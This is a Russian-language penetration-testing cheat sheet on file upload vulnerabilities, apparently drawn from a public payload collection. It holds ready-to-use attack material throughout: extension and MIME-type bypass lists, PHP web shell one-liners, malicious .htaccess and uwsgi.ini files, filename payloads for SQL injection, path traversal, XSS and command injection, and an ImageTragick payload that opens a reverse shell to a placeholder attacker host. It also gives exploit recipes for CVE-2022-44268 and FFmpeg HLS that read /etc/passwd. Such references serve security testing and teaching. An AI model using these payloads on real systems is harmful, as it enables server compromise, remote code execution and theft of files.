
> Возникает из-за неправильной проверки и фильтрации загружаемых файлов на стороне сервера. Например, если сервер не определяет тип, расширение, размер и наличие исполняемого кода в файле.
В некоторых случаях сам факт загрузки файла может быть достаточным для нанесения ущерба. Другие атаки могут включать последующий HTTP-запрос на файл, как правило, для запуска его выполнения сервером.


* **Профит**
Влияние уязвимостей загрузки файлов обычно зависит от двух ключевых факторов:
Какой аспект файла веб-сайт не может проверить должным образом, будь то его размер, тип, содержимое и т. д.
Какие ограничения налагаются на файл после его успешной загрузки.
* **Защита**

* **Обход защиты**
# Некорректная проверка типа файла
При отправке HTML-форм браузер обычно отправляет предоставленные данные в запросе POST с типом содержимого application/x-www-form-url-encoded. Этого достаточно для отправки простого текста, например вашего имени или адреса. Однако это не подходит для отправки больших объемов двоичных данных, таких как целый файл изображения или документ PDF. В этом случае предпочтительнее тип содержимого multipart/form-data.

# Предотвращение выполнения файлов в каталогах, доступных пользователю
В качестве меры предосторожности серверы обычно запускают только те скрипты, MIME-тип которых был явно настроен на выполнение. Такая конфигурация часто различается между каталогами. Каталог, в который загружаются предоставленные пользователем файлы, скорее всего, будет иметь гораздо более строгий контроль, чем другие расположения в файловой системе, которые, как предполагается, недоступны для конечных пользователей.
Веб-серверы часто используют поле имени файла в запросах multipart/form-data для определения имени и места сохранения файла.
# Недостаточное внесение в черный список опасных типов файлов 
черные списки иногда можно обойти, используя менее известные альтернативные расширения файлов, которые все еще могут быть исполняемыми, например, .php5, .shtml и т. д.php можно заменить на: .php, .php2, .php3, . php4, . php5, . php6, . php7, .phps, . pht, . phtm, .phtml, . pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module

# Переопределение конфигурации сервера
Многие серверы также позволяют разработчикам создавать специальные файлы конфигурации в отдельных каталогах, чтобы переопределить или добавить один или несколько глобальных параметров. Например, серверы Apache будут загружать конфигурацию, специфичную для каталога, из файла .htaccess, если он присутствует.
Замените содержимое файла (полезную нагрузку PHP) следующей директивой Apache:
AddType application/x-httpd-php .l33t
Это сопоставляет произвольное расширение (.l33t) с исполняемым типом MIME application/x-httpd-php. Поскольку сервер использует модуль mod_php, он уже знает, как это обрабатывать.

# Обфускация расширений файлов

1.   Укажите несколько расширений.
my_file.png.php
my_file.jpeg.html
2.    Добавить спецсимволы после расширения. Этот обход основан на особенностях низкоуровневых парсеров. Приведённые нагрузки интерпретируются как разрыв строки или null byte — окончание строки.
my_file*.php%20*
my_file*.php%0a*
my_file*.php%00*
my_file*.php%0d%0a*
my_file*.php/*
my_file*.php.\*
3.    Отрезать разрешённое расширение.
my_file.php#.png
my_file.php%00.png
my_file.php\x00.png
my_file.php%0a.png
my_file.php%0d%0a.png
4.   Добавьте конечные символы. Некоторые компоненты будут удалять или игнорировать конечные пробелы, точки и тому подобное: 
Exploit.php.
5.   Попробуйте использовать кодировку URL (или двойную кодировку URL) для точек, прямых и обратных слешей.
Exploit%2Ephp
6.    Добавьте точки с запятой или URL-кодированные нулевые байтовые символы перед расширением файла. Если проверка написана на языке высокого уровня, таком как PHP или Java, но сервер обрабатывает файл с помощью функций более низкого уровня в C/C++
Exploit.asp;.jpg 
Exploit.asp%00.jpg
7.   использовать многобайтовые символы Unicode, которые могут быть преобразованы в нулевые байты и точки после преобразования Unicode или нормализации
xC0 x2E, xC4 xAE или xC0 xAE, могут быть преобразованы в x2E, если имя файла проанализировано как строка UTF-8, но затем преобразовано в символы ASCII перед использованием в пути.
8.   Другие способы защиты включают удаление или замену опасных расширений, чтобы предотвратить выполнение файла.
exploit.p.phphp
9.   Выявить лимит на длину имени
veerrryyy_loonnggg_naaamme.php.png

* [Инструменты]()
* [Методология]()
    * [Стандартные расширения](#Стандартные-расширения)
    * [Уловки загрузки](#Уловки-загрузки)
    * [Уязвимости имени файла](#Уязвимости-имени-файла)
    * [Сжатие изображений](#Сжатие-изображений)
    * [Метаданные изображений](#Метаданные-изображений)
    * [Файлы конфигурации](#Файлы-конфигурации)
    * [CVE - ImageMagick](#CVE-ImageMagick)
    * [CVE - FFMpeg HLS](#CVE-FFMpeg-HLS)
* [URL](#URL)

> Загружаемые файлы могут представлять значительный риск при неправильной обработке. Удаленный злоумышленник может отправить POST-запрос multipart/form-data со специально созданным именем файла или MIME-типом и выполнить произвольный код.

# Инструменты

* [almandin/fuxploider](https://github.com/almandin/fuxploider) - Сканер уязвимостей загрузки файлов и инструмент эксплуатации.
* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) - Сканер загрузки HTTP-файлов для Burp Proxy.
* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) - Дополнение OWASP ZAP для поиска уязвимостей в функциональности загрузки файлов.

# Методология

### Стандартные расширения

Вот список стандартных расширений для веб-шеллов на выбранных языках (PHP, ASP, JSP).

    PHP Сервер

    .php
    .php3
    .php4
    .php5
    .php7

    # Менее известные расширения PHP
    .pht
    .phps
    .phar
    .phpt
    .pgif
    .phtml
    .phtm
    .inc

ASP Сервер

.asp
.aspx
.config
.cer # (IIS <= 7.5)
.asa # (IIS <= 7.5)
shell.aspx;1.jpg # (IIS < 7.0)
shell.soap

    JSP: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions

    Perl: .pl, .pm, .cgi, .lib

    Coldfusion: .cfm, .cfml, .cfc, .dbm

    Node.js: .js, .json, .node

Другие расширения, которые можно использовать для запуска других уязвимостей.

    .svg: XXE, XSS, SSRF
    .gif: XSS
    .csv: Инъекция CSV
    .xml: XXE
    .avi: LFI, SSRF
    .js : XSS, Открытое перенаправление
    .zip: RCE, DOS, LFI Gadget
    .html : XSS, Открытое перенаправление

### Уловки загрузки

Расширения:

    Используйте двойные расширения: .jpg.php, .png.php5

    Используйте обратное двойное расширение (полезно для эксплуатации неправильных конфигураций Apache, где выполняется код с расширением .php, но не обязательно заканчивающимся на .php): .php.jpg

    Случайный верхний и нижний регистр: .pHp, .pHP5, .PhAr

    Null byte (хорошо работает против pathinfo())
        .php%00.gif
        .php\x00.gif
        .php%00.png
        .php\x00.png
        .php%00.jpg
        .php\x00.jpg

    Специальные символы
        Несколько точек: file.php...... , в Windows при создании файла с точками в конце они будут удалены.
        Пробелы и символы новой строки
            file.php%20
            file.php%0d%0a.jpg
            file.php%0a
        Переопределение справа налево (RTLO): name.%E2%80%AEphp.jpg превратится в name.gpj.php.
        Слеш: file.php/, file.php.\, file.j\sp, file.j/sp
        Несколько специальных символов: file.jsp/././././.

    В ОС Windows функции include, require и require_once преобразуют "foo.php", за которым следует один или несколько символов \x20 ( ), \x22 ("), \x2E (.), \x3C (<), \x3E (>), обратно в "foo.php".

    В ОС Windows функция fopen преобразует "foo.php", за которым следует один или несколько символов \x2E (.), \x2F (/), \x5C (\), обратно в "foo.php".

    В ОС Windows функция move_uploaded_file преобразует "foo.php", за которым следует один или несколько символов \x2E (.), \x2F (/), \x5C (\), обратно в "foo.php".

    В ОС Windows при запуске PHP на IIS некоторые символы автоматически преобразуются в другие при сохранении файла (например, web<< становится web** и может заменить web.config).
        \x3E (>) преобразуется в \x3F (?)
        \x3C (<) преобразуется в \x2A (*)
        \x22 (") преобразуется в \x2E (.), чтобы использовать этот трюк в запросе на загрузку файла, в заголовке "Content-Disposition" следует использовать одинарные кавычки (например, filename='web"config').

Идентификация файла:

MIME-тип - это стандартизированный идентификатор, который сообщает браузерам, серверам и приложениям, с каким типом файла или данных происходит работа. Он состоит из типа и подтипа, разделенных косой чертой. Измените Content-Type: application/x-php или Content-Type: application/octet-stream на Content-Type: image/gif, чтобы замаскировать содержимое под изображение.

    Распространенные content-types для изображений:

    Content-Type: image/gif
    Content-Type: image/png
    Content-Type: image/jpeg

Wordlist для Content-Type: SecLists/web-all-content-types.txt

text/php
text/x-php
application/php
application/x-php
application/x-httpd-php
application/x-httpd-php-source

    Установите Content-Type дважды: один раз для запрещенного типа и один раз для разрешенного.

Магические байты - Иногда приложения идентифицируют типы файлов на основе их первых сигнатурных байтов. Добавление/замена их в файле может обмануть приложение.

    PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
    JPG: \xff\xd8\xff
    GIF: GIF87a ИЛИ GIF8;

Инкапсуляция файлов:

Использование альтернативного потока данных (ADS) NTFS в Windows. В этом случае символ двоеточия ":" будет вставлен после запрещенного расширения и перед разрешенным. В результате на сервере будет создан пустой файл с запрещенным расширением (например, "file.asax:.jpg"). Этот файл можно позже отредактировать, используя другие методы, такие как использование его короткого имени. Шаблон "::$data" также можно использовать для создания непустых файлов. Поэтому добавление точки после этого шаблона также может быть полезно для обхода дальнейших ограничений (например, "file.asp::$data.").

Другие методы:

PHP-веб-шеллы не всегда имеют тег <?php, вот некоторые альтернативы:

    Использование тега скрипта PHP <script language="php">

    <script language="php">system("id");</script>

<?= - это сокращенный синтаксис в PHP для вывода значений. Эквивалентен <?php echo.

<?=`$_GET[0]`?>

### Уязвимости имени файла

Иногда уязвимость заключается не в загрузке, а в том, как файл обрабатывается после. Вы можете попробовать загрузить файлы с полезными нагрузками в имени файла.

    Полезные нагрузки Time-Based SQLi: например, poc.js'(select*from(select(sleep(20)))a)+'.extension
    Полезные нагрузки LFI/Path Traversal: например, image.png../../../../../../../etc/passwd
    Полезные нагрузки XSS: например, '"><img src=x onerror=alert(document.domain)>.extension
    Обход файловой системы: например, ../../../tmp/lol.png
    Инъекция команд: например, ; sleep 10;

Также вы можете загрузить:

    HTML/SVG файлы для запуска XSS
    Файл EICAR для проверки наличия антивируса

### Сжатие изображений

Создавайте валидные изображения, содержащие PHP-код. Загрузите изображение и используйте Local File Inclusion для выполнения кода. Шелл можно вызвать следующей командой: curl 'http://localhost/test.php?0=system' --data "1='ls'".

    Метаданные изображения - скрыть полезную нагрузку внутри тега комментария в метаданных.
    Изменение размера изображения - скрыть полезную нагрузку в алгоритме сжатия, чтобы обойти изменение размера. Также обходит getimagesize() и imagecreatefromgif().
        JPG: используйте createBulletproofJPG.py
        PNG: используйте createPNGwithPLTE.php
        GIF: используйте createGIFwithGlobalColorTable.php

### Метаданные изображений

Создайте пользовательское изображение и вставьте тег exif с помощью exiftool. Список нескольких тегов exif можно найти на exiv2.org

convert -size 110x110 xc:white payload.jpg
exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Example" payload.jpg
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg

### Файлы конфигурации

Если вы пытаетесь загрузить файлы на:

    PHP сервер, посмотрите на трюк с .htaccess для выполнения кода.
    ASP сервер, посмотрите на трюк с web.config для выполнения кода.
    uWSGI сервер, посмотрите на трюк с uwsgi.ini для выполнения кода.

Примеры файлов конфигурации

    Apache: .htaccess
    IIS: web.config
    Python: __init__.py
    WSGI: uwsgi.ini

Apache: .htaccess

Директива AddType в файле .htaccess используется для указания MIME-типа для разных расширений файлов на сервере Apache HTTP. Эта директива помогает серверу понять, как обрабатывать разные типы файлов и какой тип контента с ними связывать при передаче клиентам (таким как веб-браузеры).

Вот базовый синтаксис директивы AddType:

AddType mime-type extension [extension ...]

Эксплуатируйте директиву AddType, загрузив файл .htaccess со следующим содержимым.

AddType application/x-httpd-php .rce

Затем загрузите любой файл с расширением .rce.
WSGI: uwsgi.ini

Файлы конфигурации uWSGI могут включать «магические» переменные, заполнители и операторы, определенные с точным синтаксисом. Оператор ‘@’, в частности, используется в форме @(filename) для включения содержимого файла. Поддерживается множество схем uWSGI, включая “exec” - полезно для чтения из стандартного вывода процесса. Эти операторы можно использовать для удаленного выполнения команд или произвольной записи/чтения файлов, когда анализируется файл конфигурации .ini:

Пример вредоносного файла uwsgi.ini:

[uwsgi]
; чтение из символа
foo = @(sym://uwsgi_funny_function)
; чтение из добавленных бинарных данных
bar = @(data://[REDACTED])
; чтение из http
test = @(http://[REDACTED])
; чтение из файлового дескриптора
content = @(fd://[REDACTED])
; чтение из stdout процесса
body = @(exec://whoami)
; вызов функции, возвращающей char *
characters = @(call://uwsgi_func)

Когда файл конфигурации будет разобран (например, перезапуск, сбой или авто-перезагрузка), полезная нагрузка будет выполнена.
Менеджер зависимостей

В качестве альтернативы вы можете попробовать загрузить JSON-файл с пользовательскими скриптами, попытаться перезаписать файл конфигурации менеджера зависимостей.

    package.json

    "scripts": {
        "prepare" : "/bin/touch /tmp/pwned.txt"
    }

composer.json

"scripts": {
    "pre-command-run" : [
    "/bin/touch /tmp/pwned.txt"
    ]
}

### CVE - ImageMagick

Если бэкенд использует ImageMagick для изменения размера/конвертации пользовательских изображений, вы можете попробовать эксплуатировать известные уязвимости, такие как ImageTragik.
CVE-2016–3714 - ImageTragik

Загрузите это содержимое с расширением изображения, чтобы эксплуатировать уязвимость (ImageMagick , 7.0.1-1)

    ImageTragik - пример #1

    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
    pop graphic-context

ImageTragik - пример #3

%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops

Уязвимость может быть вызвана с помощью команды convert.

convert shellexec.jpeg whatever.gif

CVE-2022-44268

CVE-2022-44268 - это уязвимость раскрытия информации, обнаруженная в ImageMagick. Злоумышленник может эксплуатировать это, создав вредоносный файл изображения, который при обработке ImageMagick может раскрыть информацию из локальной файловой системы сервера, на котором работает уязвимая версия программного обеспечения.

    Сгенерируйте полезную нагрузку

    apt-get install pngcrush imagemagick exiftool exiv2 -y
    pngcrush -text a "profile" "/etc/passwd" exploit.png

    Вызовите эксплойт, загрузив файл. Бэкенд может использовать что-то вроде convert pngout.png pngconverted.png

    Скачайте преобразованное изображение и проверьте его содержимое с помощью: identify -verbose pngconverted.png

    Преобразуйте эксфильтрованные данные: python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'

Больше полезных нагрузок в папке Picture ImageMagick/.
### CVE - FFMpeg HLS

FFmpeg - это открытое программное обеспечение, используемое для обработки аудио и видео форматов. Вы можете использовать вредоносный плейлист HLS внутри видео AVI для чтения произвольных файлов.

    ./gen_xbin_avi.py file://<имя_файла> file_read.avi
    Загрузите file_read.avi на какой-нибудь сайт, который обрабатывает видеофайлы
    На стороне сервера, выполняется видеосервисом: ffmpeg -i file_read.avi output.mp4
    Нажмите "Play" в видеосервисе.
    Если вам повезет, вы увидите содержимое <имя_файла> с сервера.

Скрипт создает AVI, который содержит плейлист HLS внутри GAB2. Плейлист, сгенерированный этим скриптом, выглядит так:

#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST

Больше полезных нагрузок в папке CVE FFmpeg HLS/.
